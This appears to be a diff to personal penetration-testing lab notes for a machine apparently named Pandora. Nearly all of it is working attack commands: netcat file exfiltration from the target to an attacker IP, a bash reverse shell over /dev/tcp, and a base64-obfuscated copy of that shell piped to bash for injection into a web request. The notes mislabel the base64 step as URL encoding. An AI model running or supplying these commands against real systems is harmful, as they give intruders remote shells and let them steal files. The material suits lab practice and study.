@@ -23,4 +23,12 @@ sending files from Lab machine to attacker machine
 nc 10.10.14.41 9002 < /usr/bin/pandora_backup
 nc -nlvp 9002 > pandora_backup  
 
+If dev/tcp is not in dash
+bash -c 'bash -i >& /dev/tcp/10.10.14.41/9001 0>&1'
+============-------------=================
+Using URL encoding:
+echo -n 'bash -i >& /dev/tcp/10.10.14.41/9001 0>&1' | base64 -w 0
 
+paste in request as:
+echo -n YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC40MS85MDAxIDA+JjE== | base64 -d | bash
+================----------------===============
